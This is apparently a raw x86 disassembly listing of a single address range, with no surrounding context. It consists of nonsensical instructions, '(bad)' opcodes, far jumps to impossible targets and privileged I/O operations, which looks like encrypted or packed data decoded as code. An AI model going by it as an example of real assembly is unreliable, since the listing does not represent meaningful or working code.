  4150af:	sub    bl,BYTE PTR [ecx-0x22726de1]
  4150b5:	es xchg ebx,eax
  4150b7:	dec    DWORD PTR [ecx-0x6d]
  4150ba:	sub    eax,0xaed16e51
  4150bf:	scas   al,BYTE PTR es:[edi]
  4150c0:	call   0xffe3:0xae6b96b4
  4150c7:	ja     0x415059
  4150c9:	or     eax,DWORD PTR [ebx-0x31777f8f]
  4150cf:	mov    ebx,DWORD PTR [edx+ebx*1-0x5b07781f]
  4150d6:	pop    esi
  4150d7:	cld    
  4150d8:	and    BYTE PTR ds:0x875c3949,cl
  4150de:	mov    ebx,0xf281da9c
  4150e3:	mov    ds:0x4a03cae1,al
  4150e8:	mov    edi,0x26891580
  4150ed:	xchg   edi,eax
  4150ee:	test   esi,0x29425852
  4150f4:	adc    bh,BYTE PTR [esi]
  4150f6:	lea    eax,[ecx+0x25]
  4150f9:	push   0x2a1ccee4
  4150fe:	jbe    0x415174
  415100:	jns    0x415126
  415102:	sub    eax,0x18265033
  415107:	push   ds
  415108:	hlt    
  415109:	xlat   BYTE PTR ds:[ebx]
  41510a:	xor    BYTE PTR [edi],dl
  41510c:	clc    
  41510d:	pop    DWORD PTR es:[ebx]
  415110:	inc    ebp
  415111:	int    0x7
  415113:	call   0x50ef:0x659ac86d
  41511a:	jg     0x41518a
  41511c:	xchg   ebx,eax
  41511d:	loopne 0x41510f
  41511f:	adc    eax,DWORD PTR [edx-0x67]
  415122:	mov    BYTE PTR [edi],bh
  415124:	mov    edi,0x686b77d7
  415129:	test   DWORD PTR [edi+eiz*2-0x38],ecx
  41512d:	loopne 0x415116
  41512f:	xor    al,0xa4
  415131:	xchg   edx,eax
  415132:	cdq    
  415133:	ror    DWORD PTR [edi+ecx*1+0x2bbf58c9],cl
  41513a:	stc    
  41513b:	mov    esi,0x82376ae
  415140:	sahf   
  415141:	push   eax
  415142:	adc    BYTE PTR [ebp+0x6f],dh
  415145:	mov    ah,0x90
  415147:	push   cs
  415148:	add    BYTE PTR [edi+edi*1-0x35],0x25
  41514d:	jp     0x415112
  41514f:	inc    eax
  415150:	sub    al,0x29
  415152:	xor    eax,0xdd1bf213
  415157:	jne    0x41519d
  415159:	pop    eax
  41515a:	pop    ds
  41515b:	dec    edi
  41515c:	cwde   
  41515d:	adc    eax,0x4778690
  415162:	or     bl,BYTE PTR [esi-0x6d]
  415165:	popa   
  415166:	or     eax,0x8ab767e1
  41516b:	add    dh,ch
  41516d:	jbe    0x41514e
  41516f:	jo     0x415130
  415171:	inc    ebp
  415172:	xchg   esp,eax
  415173:	xor    esi,DWORD PTR [ebp-0xb]
  415176:	rol    BYTE PTR [edi],cl
  415178:	ins    BYTE PTR es:[edi],dx
  415179:	bound  ebp,QWORD PTR ds:0x6c402295
  41517f:	ror    BYTE PTR [ecx-0x56d4377e],0xa4
  415186:	xor    BYTE PTR [eax-0x409b6503],bl
  41518c:	call   DWORD PTR [esi-0x99bf50d]
  415192:	ins    DWORD PTR es:[edi],dx
  415193:	ret    0x4784
  415196:	fld    DWORD PTR [ebx+ecx*1-0x1d]
  41519a:	sub    eax,0x73f7f003
  41519f:	mov    al,0xed
  4151a1:	cdq    
  4151a2:	out    dx,al
  4151a3:	xchg   eax,edi
  4151a5:	or     al,0xb2
  4151a7:	sub    BYTE PTR [ecx-0x5049196e],0xca
  4151ae:	jnp    0x4151d6
  4151b0:	push   edx
  4151b1:	nop
  4151b2:	mov    esp,0xe3c9c59e
  4151b7:	aaa    
  4151b8:	cmp    al,0x43
  4151ba:	mov    dh,0x28
  4151bc:	dec    BYTE PTR [edi+0x6b]
  4151bf:	je     0x415172
  4151c1:	in     al,dx
  4151c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151c3:	je     0x415197
  4151c5:	adc    edi,edx
  4151c7:	inc    edi
  4151c8:	sbb    BYTE PTR [edx+0x61],0x4
  4151cc:	popa   
  4151cd:	jmp    0x23e6:0xe052d77c
  4151d4:	es mov bl,0xe2
  4151d7:	push   eax
  4151d8:	ins    DWORD PTR es:[edi],dx
  4151d9:	or     cl,BYTE PTR [edx]
  4151db:	add    BYTE PTR [ebx],ch
  4151dd:	or     eax,0x40348e9d
  4151e2:	jbe    0x415232
  4151e4:	dec    edx
  4151e5:	jle    0x41523a
  4151e7:	and    edi,DWORD PTR ds:0x30f18006
  4151ed:	mov    al,ds:0x804f9ca0
  4151f2:	loopne 0x4151d1
  4151f4:	push   ds
  4151f5:	popa   
  4151f6:	jg     0x4151de
  4151f8:	mov    edx,DWORD PTR [esi-0x80]
  4151fb:	retf   
  4151fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151fd:	push   ecx
  4151fe:	in     al,dx
  4151ff:	cmp    al,bh
  415201:	out    0xba,eax
  415203:	mov    esi,0x510d5851
  415208:	(bad)  
  415209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41520a:	in     al,0x4b
  41520c:	add    BYTE PTR [ecx],ch
  41520e:	stos   DWORD PTR es:[edi],eax
  41520f:	popf   
  415210:	das    
  415211:	into   
  415212:	xlat   BYTE PTR ds:[ebx]
  415213:	cli    
  415214:	sub    eax,0x16bb5d4c
  415219:	stos   DWORD PTR es:[edi],eax
  41521a:	xchg   DWORD PTR [edx+0x3b],edx
  41521d:	cmp    eax,DWORD PTR [eax+0x76]
  415220:	(bad)  
  415221:	(bad)  
  415222:	cs (bad) 
  415224:	outs   dx,BYTE PTR ds:[esi]
  415225:	jne    0x4151e6
  415227:	dec    ebx
  415228:	mov    edx,0x40b80433
  41522d:	add    esi,DWORD PTR [ebp+0x4d]
  415230:	int    0x9c
  415232:	xor    BYTE PTR [ecx+0x22],ch
  415235:	inc    ecx
  415236:	cmp    bh,BYTE PTR [ecx]
  415238:	push   ds
  415239:	inc    ebx
  41523a:	mov    eax,ds:0xa06ababd
  41523f:	pop    edx
  415240:	adc    ebp,ecx
  415242:	add    DWORD PTR [eax+eax*8-0x5],esp
  415246:	(bad)  
  415247:	xor    ebx,esi
  415249:	lahf   
  41524a:	daa    
  41524b:	dec    edi
  41524c:	out    dx,eax
  41524d:	push   esi
  41524e:	(bad)  
  415250:	sub    eax,0x96e04ff0
  415255:	test   eax,0x9cca563
  41525a:	pop    ebx
  41525b:	push   ss
  41525c:	(bad)  
  41525d:	xlat   BYTE PTR ds:[ebx]
  41525e:	xchg   ecx,eax
  41525f:	sub    eax,edi
  415261:	ins    DWORD PTR es:[edi],dx
  415262:	xchg   esi,eax
  415263:	mov    bl,BYTE PTR [ecx-0x378e6ee]
  415269:	jmp    0x87ea:0x3a7fba83
  415270:	xor    BYTE PTR [eax-0x6c],al
  415273:	fwait
  415274:	add    eax,0x3711f96b
  415279:	dec    edx
  41527a:	adc    al,0x15
  41527c:	daa    
  41527d:	shr    DWORD PTR [edi+0x73e4db6a],0xfe
  415284:	jecxz  0x4152c9
  415286:	dec    ebp
  415287:	hlt    
  415288:	imul   esi,DWORD PTR [ebp+0x52],0x5b74248
  41528f:	cwde   
  415290:	mov    dh,bh
  415292:	sub    esp,DWORD PTR es:[edi]
  415295:	daa    
  415296:	outs   dx,DWORD PTR ds:[esi]
  415297:	shr    DWORD PTR [ebx+0x414d9d70],0x49
  41529e:	dec    edx
  41529f:	pop    edx
  4152a0:	es mov cl,cl
  4152a3:	sub    BYTE PTR [edi],dl
  4152a5:	or     al,0x24
  4152a7:	sahf   
  4152a8:	hlt    
  4152a9:	ja     0x4152ee
  4152ab:	xchg   esi,eax
  4152ac:	cli    
  4152ad:	call   0xee845918
  4152b2:	jno    0x4152aa
  4152b4:	imul   ebp,DWORD PTR [ecx-0xd],0xffffffd2
  4152b8:	jae    0x415323
  4152ba:	mov    dh,0x2d
  4152bc:	xchg   ebx,eax
  4152bd:	xor    ecx,DWORD PTR ds:0xad597597
  4152c3:	(bad)  
  4152c4:	out    dx,al
  4152c5:	adc    ecx,DWORD PTR ds:0x5a3cf6fc
  4152cb:	sahf   
  4152cc:	dec    esi
  4152cd:	retf   
  4152ce:	and    eax,0x3f9fb6a0
  4152d3:	ret    
  4152d4:	jmp    0x494eef66
  4152d9:	cmp    al,0x73
  4152db:	sub    BYTE PTR [edx-0x39],ch
  4152de:	dec    edx
  4152df:	(bad)  
  4152e0:	popa   
  4152e1:	and    dl,BYTE PTR [esi]
  4152e3:	jbe    0x4152cf
  4152e5:	xchg   edx,eax
  4152e6:	push   edi
  4152e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152e8:	nop
  4152e9:	in     al,0xa7
  4152eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152ec:	int    0x5
  4152ee:	dec    ebp
  4152ef:	sub    al,0x3f
  4152f1:	inc    ecx
  4152f2:	push   esp
  4152f3:	pop    esi
  4152f4:	sub    DWORD PTR [edi+0x29],0xffffffde
  4152f8:	mov    esp,0x1cb5e527
  4152fd:	or     BYTE PTR ds:0xc2a95462,0x43
  415304:	shl    DWORD PTR [ecx+ebp*4],1
  415307:	xor    BYTE PTR [edi+eiz*8-0x754ffaa7],ch
  41530e:	jmp    0x415387
  415310:	into   
  415311:	jle    0x41530c
  415313:	lds    edi,FWORD PTR [ebx-0x67a8cdf2]
  415319:	loopne 0x41533f
  41531b:	test   DWORD PTR gs:[eax+0x1a],ecx
  41531f:	cld    
  415320:	adc    DWORD PTR [eax+0x4ec9a7f5],edx
  415326:	repnz adc BYTE PTR [eax+0x6f],cl
  41532a:	aaa    
  41532b:	mov    bl,0x25
  41532d:	xchg   BYTE PTR [ebx+esi*8+0x29f0855c],al
  415334:	xchg   edi,eax
  415335:	mov    ecx,0x7ca1b2d
  41533a:	mov    al,0xba
  41533c:	enter  0x172c,0xc
  415340:	sub    eax,0xcfac7b09
  415345:	mov    eax,ds:0x832a1d41
  41534a:	int3   
  41534b:	scas   eax,DWORD PTR es:[edi]
  41534c:	das    
  41534d:	xor    BYTE PTR [esi-0x6e264e7e],0x3e
  415354:	sahf   
  415355:	xchg   bl,al
  415357:	pusha  
  415358:	ds gs jmp 0xc29c409e
  41535f:	xchg   BYTE PTR es:[ebx+0x27],bh
  415363:	and    DWORD PTR [eax+0x1cff91a6],edx
  415369:	dec    eax
  41536a:	cmp    DWORD PTR [ebp+0x5e],esp
  41536d:	sahf   
  41536e:	pop    esp
  41536f:	cmp    BYTE PTR [ecx+eiz*1-0x609b9562],dl
  415376:	adc    DWORD PTR [esi+0x52],edi
  415379:	out    0x2f,eax
  41537b:	dec    edx
  41537c:	sub    al,0x98
  41537e:	les    ebp,FWORD PTR [ebp+0x75a873a5]
  415384:	(bad)  
  415386:	dec    esi
  415387:	fbld   TBYTE PTR [ebx+ebp*8-0x70088bf5]
  41538e:	xor    al,0xa8
  415390:	pop    ss
  415391:	push   edi
  415392:	mov    ds:0x6143592b,eax
  415397:	push   ebx
  415398:	sbb    DWORD PTR [ecx+0x59],edx
  41539b:	scas   eax,DWORD PTR es:[edi]
  41539c:	jae    0x415329
  41539e:	xor    bh,BYTE PTR [ecx]
  4153a0:	mov    BYTE PTR [ecx+0x5aa9213b],0x14
  4153a7:	frstor [edx-0x80]
  4153aa:	push   ds
  4153ab:	loope  0x415345
  4153ad:	sbb    BYTE PTR [esi-0x4f],bl
  4153b0:	lock das 
  4153b2:	pop    esi
  4153b3:	dec    edi
  4153b4:	test   al,0x81
  4153b6:	mov    cr0,edi
  4153b9:	dec    edi
  4153ba:	pop    es
  4153bb:	shr    BYTE PTR [edx+0x33],1
  4153be:	jp     0x415368
  4153c0:	or     al,0x9e
  4153c2:	add    ecx,DWORD PTR [ebx+0x5832b8f0]
  4153c8:	or     al,0xc1
  4153ca:	in     eax,0xe1
  4153cc:	and    esi,edi
  4153ce:	inc    bp
  4153d0:	sub    dh,cl
  4153d2:	test   DWORD PTR [esi+esi*1],esp
  4153d5:	iret   
  4153d6:	jle    0x415447
  4153d8:	cdq    
  4153d9:	int    0xcd
  4153db:	aam    0xd4
  4153dd:	pop    es
  4153de:	fdivr  DWORD PTR [edx]
  4153e0:	pop    ebx
  4153e1:	jle    0x41541d
  4153e3:	std    
  4153e4:	jae    0x415453
  4153e6:	jbe    0x415412
  4153e8:	test   al,0xcd
  4153ea:	inc    edx
  4153eb:	lods   eax,DWORD PTR ds:[esi]
  4153ec:	pushf  
  4153ed:	add    BYTE PTR [ecx-0x26],dl
  4153f0:	es pop ds
  4153f2:	int3   
  4153f3:	jnp    0x415471
  4153f5:	outs   dx,DWORD PTR ds:[esi]
  4153f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153f7:	inc    ebp
  4153f8:	mov    edi,0x94cc9fef
  4153fd:	mov    ecx,0xdb806f71
  415402:	les    esi,FWORD PTR [eax+edi*1-0x2a]
  415406:	mov    fs,eax
  415408:	shl    BYTE PTR [eax+edx*8-0x73],0x66
  41540d:	or     ebp,ecx
  41540f:	push   esi
  415410:	ror    DWORD PTR [eax+0x724ebd1d],0xfe
  415417:	fs inc edx
  415419:	fwait
  41541a:	pusha  
  41541b:	dec    eax
  41541c:	xchg   edi,eax
  41541d:	dec    edi
  41541e:	and    al,0x83
  415420:	sar    BYTE PTR [edx-0x380ab5af],0x2c
  415427:	xchg   bl,bl
  415429:	push   esp
  41542a:	inc    edx
  41542b:	xchg   edx,eax
  41542c:	dec    ebx
  41542d:	mov    eax,ds:0x5adf3cb
  415432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415433:	aad    0xf5
  415435:	ror    DWORD PTR [edi*8-0x90b3166],0xc1
  41543d:	ret    
  41543e:	xchg   BYTE PTR [edi+0x315be934],ch
  415444:	imul   esi,DWORD PTR [edi+0x5c03bb34],0xda8cd8b6
  41544e:	mov    al,ds:0x79eb4d1e
  415453:	dec    ebx
  415454:	inc    ebx
  415455:	xchg   edx,edi
  415457:	mov    eax,ds:0x164bac11
  41545c:	add    dh,BYTE PTR [edi+0x5795cd1b]
  415462:	bound  ecx,QWORD PTR [edi]
  415464:	adc    DWORD PTR [ecx+edi*4-0x22],0x7e
  415469:	(bad)  
  41546b:	outs   dx,BYTE PTR ds:[esi]
  41546c:	xor    al,0xca
  41546e:	and    DWORD PTR [ecx+0x6c],ebp
  415471:	adc    eax,0x2cf25562
  415476:	add    DWORD PTR [ebx],ebx
  415478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415479:	jg     0x41545b
  41547b:	sub    BYTE PTR [ebx-0x47b5c7eb],dl
  415481:	lods   al,BYTE PTR ds:[esi]
  415482:	mov    dl,bh
  415484:	div    DWORD PTR [eax+0x6e4634f7]
  41548a:	add    BYTE PTR [edx+0x43],0xae
  41548e:	mov    eax,ds:0xcad19954
  415493:	cmp    al,0x2
  415495:	fadd   DWORD PTR [ebx-0x59]
  415498:	adc    DWORD PTR [edi+ebp*2+0x55161fec],0xffffffcc
  4154a0:	dec    ecx
  4154a1:	fs stos BYTE PTR es:[edi],al
  4154a3:	daa    
  4154a4:	sahf   
  4154a5:	or     BYTE PTR [edi+ecx*2+0xf97f135],0xa3
  4154ad:	sub    edx,DWORD PTR [edx+0xd]
  4154b0:	sbb    DWORD PTR [ecx+edi*8],ebp
  4154b3:	sbb    al,0xb6
  4154b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154b6:	sar    DWORD PTR [ebp+0x67],0x74
  4154ba:	or     BYTE PTR [ecx],0x58
  4154bd:	sub    edi,0xf46f0a1b
  4154c3:	lds    eax,FWORD PTR [eax-0x4f]
  4154c6:	shl    BYTE PTR ds:0x6fdeb572,cl
  4154cc:	das    
  4154cd:	neg    DWORD PTR [ecx+0x28349b78]
  4154d3:	jle    0x4154ec
  4154d5:	lea    ebx,[eax+0x1e]
  4154d8:	jle    0x41550c
  4154da:	xor    BYTE PTR [esi+0x20],dl
  4154dd:	pand   mm0,QWORD PTR [eax+ebp*8+0x7420f50b]
  4154e5:	push   ecx
  4154e6:	xor    DWORD PTR [edi],0xffffff8a
  4154e9:	pop    es
  4154ea:	jne    0x4154c4
  4154ec:	or     dl,0xc0
  4154ef:	std    
  4154f0:	pop    ecx
  4154f1:	jg     0x415558
  4154f3:	mov    esi,0xd4859182
  4154f8:	iret   
  4154f9:	data16 and BYTE PTR [edx+0x1bb1922a],0x90
  415501:	int3   
  415502:	mov    eax,ds:0x6e65c770
  415507:	stc    
  415508:	ins    BYTE PTR es:[edi],dx
  415509:	out    0x98,al
  41550b:	mov    ebp,0x7ec894e8
  415510:	loopne 0x4154fd
  415512:	lods   al,BYTE PTR ds:[esi]
  415513:	pop    edx
  415514:	cmp    eax,0xf4358a0e
  415519:	and    dh,ch
  41551b:	and    DWORD PTR [ebp+0x3d],eax
  41551e:	test   bh,al
  415520:	push   ecx
  415521:	out    0x81,eax
  415523:	ja     0x415544
  415525:	cmp    eax,DWORD PTR [ebx-0x15]
  415528:	or     al,0x98
  41552a:	rcl    BYTE PTR [ebx+0x1d15c7f3],0x43
  415531:	out    dx,eax
  415532:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415533:	xchg   esp,eax
  415534:	pusha  
  415535:	jmp    0x6a2564ea
  41553a:	cmc    
  41553b:	stos   DWORD PTR es:[edi],eax
  41553c:	(bad)  [edi+0x6d359dd9]
  415542:	les    edi,FWORD PTR [ebx+ebx*2]
  415545:	sbb    BYTE PTR [ebp+0x24],bh
  415548:	push   edx
  415549:	fld    QWORD PTR [eax+0x660b9beb]
  41554f:	(bad)  
  415552:	(bad)  
  415554:	call   0x8dff:0x362c5864
  41555b:	push   0x2b012a3f
  415560:	jmp    0xa3f3dd2d
  415565:	gs sub esi,ebp
  415568:	jbe    0x415592
  41556a:	or     DWORD PTR [ecx],ebp
  41556c:	inc    edx
  41556d:	ret    
  41556e:	in     eax,0xe5
  415570:	xchg   esp,eax
  415571:	repz rcl BYTE PTR [edx+0x77],1
  415575:	jae    0x415590
  415577:	fwait
  415578:	mov    ebx,edi
  41557a:	xor    al,0xc1
  41557c:	ror    BYTE PTR [edx-0x317b4e00],0x61
  415583:	add    bh,bh
  415585:	sub    ah,cl
  415587:	fistp  DWORD PTR [ebp-0x64f7d353]
  41558d:	dec    edi
  41558e:	push   ds
  41558f:	mov    cl,0x7d
  415591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415592:	test   eax,0x185b10ae
  415597:	aas    
  415598:	adc    eax,0xacbe1284
  41559d:	jno    0x4155c8
  41559f:	dec    eax
  4155a0:	repnz dec edi
  4155a2:	nop
  4155a3:	xchg   esp,eax
  4155a4:	jns    0x41561d
  4155a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155a7:	push   esp
  4155a8:	mov    al,es:0x11099bac
  4155ae:	sub    esp,0x28ac9559
  4155b4:	push   edi
  4155b5:	mov    BYTE PTR ds:0xa6d0c4bb,cl
  4155bb:	rol    DWORD PTR [ebx+ebp*2],0xed
  4155bf:	jae    0x4155bb
  4155c1:	outs   dx,BYTE PTR ds:[esi]
  4155c2:	dec    esi
  4155c3:	push   es
  4155c4:	inc    esp
  4155c5:	inc    esp
  4155c6:	push   0xffffffc2
  4155c8:	xor    al,BYTE PTR [esi+edi*1-0x39]
  4155cc:	sbb    DWORD PTR [eax-0x78a6e520],edi
  4155d2:	push   0xf9932156
  4155d7:	or     BYTE PTR [ebx],0xe7
  4155da:	imul   ebp,DWORD PTR [edi+0x755a7d37],0x50c3eb04
  4155e4:	add    ebp,DWORD PTR [ecx-0x3ebd293]
  4155ea:	push   0x16
  4155ec:	not    DWORD PTR [eax+esi*1+0x44]
  4155f0:	je     0x415583
  4155f2:	and    DWORD PTR [ebx],esp
  4155f4:	mov    esi,DWORD PTR [ebp+0x37]
  4155f7:	jecxz  0x415627
  4155f9:	dec    ebp
  4155fa:	aas    
  4155fb:	pop    esi
  4155fc:	mov    ds:0x93ae2e16,al
  415601:	stc    
  415602:	jp     0x4155f1
  415604:	dec    esp
  415605:	cdq    
  415606:	in     al,0x70
  415608:	daa    
  415609:	push   ebp
  41560a:	lea    eax,[edi+0x55a91fe]
  415610:	(bad)  
  415611:	dec    edi
  415612:	enter  0xf3ca,0x1a
  415616:	add    esi,DWORD PTR [ebp-0x47dc6ef6]
  41561c:	jmp    0x4155ba
  41561e:	dec    eax
  41561f:	pushf  
  415620:	xor    DWORD PTR [ebp-0x668d4377],0xffffffcb
  415627:	scas   al,BYTE PTR es:[edi]
  415628:	scas   eax,DWORD PTR es:[edi]
  415629:	push   cs
  41562a:	push   cs
  41562b:	and    eax,0xe94233a0
  415630:	mov    ds:0xa4f382cd,eax
  415635:	sub    esp,DWORD PTR [edx+0x67]
  415638:	or     DWORD PTR [ebp+0x5c],esi
  41563b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41563c:	fdiv   QWORD PTR [ebx+0x4d4e0677]
  415642:	or     ebx,DWORD PTR [ecx]
  415644:	mov    eax,0x586483f5
  415649:	nop
  41564a:	sbb    ch,BYTE PTR [eax]
  41564c:	xchg   ecx,eax
  41564d:	repnz xor BYTE PTR [edx+0x25],dh
  415651:	ret    0x71bc
  415654:	shr    BYTE PTR [eax+esi*1-0xe],1
  415658:	mov    edx,0xdb97ff9
  41565d:	inc    ebp
  41565e:	arpl   WORD PTR [esp+eax*1-0x19f9c8e8],dx
  415665:	ffree  st(1)
  415667:	dec    ebp
  415668:	inc    dx
  41566a:	inc    esi
  41566b:	or     al,0x9a
  41566d:	xchg   ebx,eax
  41566e:	pop    ds
  41566f:	das    
  415670:	lods   eax,DWORD PTR ds:[esi]
  415671:	dec    esp
  415672:	push   edx
  415673:	jmp    0x662eb941
  415678:	(bad)  
  415679:	push   ebp
  41567a:	sbb    ecx,DWORD PTR [bx]
  41567d:	hlt    
  41567e:	lds    ecx,FWORD PTR [ebx+eiz*1+0x6c51b8df]
  415685:	push   es
  415686:	test   eax,0x306e659f
  41568b:	dec    DWORD PTR ds:0x64910a96
  415691:	cmp    al,0x63
  415693:	and    DWORD PTR [ebp+0x3a],edi
  415696:	push   0xffffffd7
  415698:	and    al,0x48
  41569a:	outs   dx,BYTE PTR ds:[esi]
  41569b:	repz sub al,0x93
  41569e:	xor    eax,0xf8f6a183
  4156a3:	cmp    BYTE PTR [edi+0xd],0xa2
  4156a7:	adc    bh,BYTE PTR [edx]
  4156a9:	mov    ds:0x1917db95,al
  4156ae:	lods   al,BYTE PTR ds:[esi]
  4156af:	out    dx,al
  4156b0:	jno    0x41564a
  4156b2:	(bad)  
  4156b3:	rcl    bl,1
  4156b5:	(bad)  
  4156b6:	(bad)  
  4156b8:	inc    ebp
  4156b9:	ret    
  4156ba:	imul   edx,ebp,0xffffffab
  4156bd:	(bad)  
  4156be:	mov    ebx,0x19d47aaf
  4156c3:	and    BYTE PTR [ebx],dh
  4156c5:	push   ds
  4156c6:	push   ss
  4156c7:	fmul   QWORD PTR [ebp+0x51]
  4156ca:	cwde   
  4156cb:	xor    eax,0xf05c1f29
  4156d0:	ror    edi,0xa4
  4156d3:	jne    0x4156f5
  4156d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156d6:	(bad)  
  4156d7:	push   ds
  4156d8:	test   BYTE PTR [esi-0x38d4196a],cl
  4156de:	mov    ds:0x2fa8d2d8,eax
  4156e3:	mov    ds:0x98147f75,eax
  4156e8:	(bad)  
  4156e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156ea:	xor    BYTE PTR [ebp+ecx*1+0x269e5af9],dh
  4156f1:	xchg   edi,eax
  4156f2:	mov    ds:0x64c546b8,al
  4156f7:	sub    ah,BYTE PTR [ebp+0x5f]
  4156fa:	mov    ebx,esp
  4156fc:	push   ecx
  4156fd:	fimul  DWORD PTR [ebp-0x2ce46b6]
  415703:	mov    ecx,0xd6e26634
  415708:	mov    ebx,0xb71e43b5
  41570d:	and    ecx,ebp
  41570f:	add    DWORD PTR [edx-0x6ee4d920],ebp
  415715:	loope  0x415712
  415717:	jnp    0x4156ff
  415719:	(bad)  
  41571a:	mov    bl,0xd2
  41571c:	or     bl,al
  41571e:	sbb    BYTE PTR [esi],cl
  415720:	and    BYTE PTR [ebp-0x74],0x7f
  415724:	jbe    0x415751
  415726:	or     ebx,esi
  415728:	dec    ecx
  415729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41572a:	jecxz  0x415782
  41572c:	clc    
  41572d:	dec    esi
  41572e:	out    0x2d,al
  415730:	push   0x37
  415732:	dec    BYTE PTR [ebx-0x1e]
  415735:	push   0xffffffbd
  415737:	inc    ebx
  415738:	fld    st(6)
  41573a:	scas   al,BYTE PTR es:[edi]
  41573b:	add    BYTE PTR [edi-0x9],0x27
  41573f:	sub    al,0x4
  415741:	inc    ecx
  415742:	bound  edx,QWORD PTR [edi]
  415744:	cmp    al,0xe9
  415746:	mov    al,0xb9
  415748:	sbb    DWORD PTR [ebp-0x3442b33a],esp
  41574e:	adc    edi,DWORD PTR [ebx+0x3872ebd1]
  415754:	add    edi,esi
  415756:	push   ebp
  415757:	sub    BYTE PTR [edx],dl
  415759:	(bad)  
  41575a:	sub    ah,BYTE PTR ds:0xb0ea3d9e
  415760:	mov    dh,0x68
  415762:	jb     0x4156f6
  415764:	call   0x5db21b63
  415769:	xor    ch,BYTE PTR [edx-0x25]
  41576c:	or     al,0x88
  41576e:	int3   
  41576f:	jo     0x4157a6
  415771:	loopne 0x4157ba
  415773:	xchg   esp,eax
  415774:	inc    ecx
  415775:	sbb    BYTE PTR [esi],dh
  415777:	xchg   ah,al
  415779:	out    dx,al
  41577a:	push   edx
  41577b:	mov    al,0x92
  41577d:	xchg   edi,eax
  41577e:	cmp    al,0x51
  415780:	nop
  415781:	dec    ebx
  415782:	dec    ecx
  415783:	std    
  415784:	loope  0x415746
  415786:	daa    
  415787:	out    0xc4,al
  415789:	add    bl,dh
  41578b:	jo     0x415741
  41578d:	and    dh,BYTE PTR [eax]
  41578f:	es mov ebx,0x5ad20c09
  415795:	push   cs
  415796:	scas   eax,DWORD PTR es:[edi]
  415797:	mov    BYTE PTR [eax+0x16a14cdb],dh
  41579d:	int3   
  41579e:	outs   dx,DWORD PTR ds:[esi]
  41579f:	inc    ecx
  4157a0:	pop    edi
  4157a1:	jb     0x415808
  4157a3:	xor    DWORD PTR [edi],edi
  4157a5:	in     eax,0xe8
  4157a7:	mov    ecx,0x91df6332
  4157ac:	sahf   
  4157ad:	cmp    DWORD PTR [edi],ebx
  4157af:	fisubr WORD PTR [esi-0x333403d1]
  4157b5:	int3   
  4157b6:	xchg   edi,eax
  4157b7:	cli    
  4157b8:	mov    ecx,0xe7f63cc0
  4157bd:	test   al,0x54
  4157bf:	push   edi
  4157c0:	pop    esp
  4157c1:	addr16 jns 0x4157c1
  4157c4:	mov    ecx,0x7f3e2e37
  4157c9:	loopne 0x41580a
  4157cb:	mov    ch,0x15
  4157cd:	or     ch,bh
  4157cf:	inc    cl
  4157d1:	stc    
  4157d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157d3:	enter  0x8ae,0x2
  4157d7:	jecxz  0x415821
  4157d9:	inc    ecx
  4157da:	call   0x519c3a87
  4157df:	jge    0x4157a9
  4157e1:	push   cs
  4157e2:	popa   
  4157e3:	rol    BYTE PTR [ecx+0x4d1bd2d2],1
  4157e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157ea:	enter  0x9675,0xb8
  4157ee:	adc    al,0x36
  4157f0:	cld    
  4157f1:	ins    BYTE PTR es:[edi],dx
  4157f2:	test   al,0x44
  4157f4:	ror    ecx,0x53
  4157f7:	mov    ds:0xceab6d5a,al
  4157fc:	adc    al,0xf7
  4157fe:	xor    eax,0x8a42529d
  415803:	fs inc ebx
  415805:	dec    esi
  415806:	aas    
  415807:	nop
  415808:	xchg   ebp,eax
  415809:	or     BYTE PTR [ebx+edx*1-0x65],dl
  41580d:	repnz inc esi
  41580f:	shl    BYTE PTR [eax-0x46],0x7f
  415813:	in     al,dx
  415814:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415816:	mov    edx,0xea770416
  41581b:	jb     0x41589c
  41581d:	rol    BYTE PTR ds:0x745b2b32,1
  415823:	outs   dx,BYTE PTR ds:[esi]
  415824:	sbb    eax,0x2e6cb19b
  415829:	lea    ecx,[eax+0x19c82370]
  41582f:	xchg   DWORD PTR [edi-0x44],edx
  415832:	sub    al,0x40
  415834:	jmp    0x41580b
  415836:	inc    edx
  415837:	(bad)  
  415838:	pop    ss
  415839:	lea    edx,[ecx+edx*2-0x4a]
  41583d:	imul   esi,eax,0x68
  415840:	push   edx
  415841:	sub    BYTE PTR [edi+0x37cb187f],bl
  415847:	mov    esp,0x8ab8a38b
  41584c:	shl    BYTE PTR [ecx+eax*1+0x344dc210],1
  415853:	les    edx,FWORD PTR [esi]
  415855:	clc    
  415856:	jo     0x415833
  415858:	test   BYTE PTR [edx],bh
  41585a:	pushf  
  41585b:	jp     0x415802
  41585d:	xor    eax,0x34fedf47
  415862:	sbb    DWORD PTR [ebx-0x68],esi
  415865:	popa   
  415866:	sar    DWORD PTR [eax+0x3424c97],cl
  41586c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41586d:	adc    ebx,DWORD PTR [edx-0x78c75c01]
  415873:	sub    al,0xaa
  415875:	dec    esp
  415876:	mov    eax,ds:0xb58e2336
  41587b:	in     al,0x82
  41587d:	cmp    DWORD PTR [esi-0x70],ecx
  415880:	push   ss
  415881:	stos   BYTE PTR es:[edi],al
  415882:	jecxz  0x415902
  415884:	neg    DWORD PTR [edx]
  415886:	into   
  415887:	cmp    eax,0xae373c26
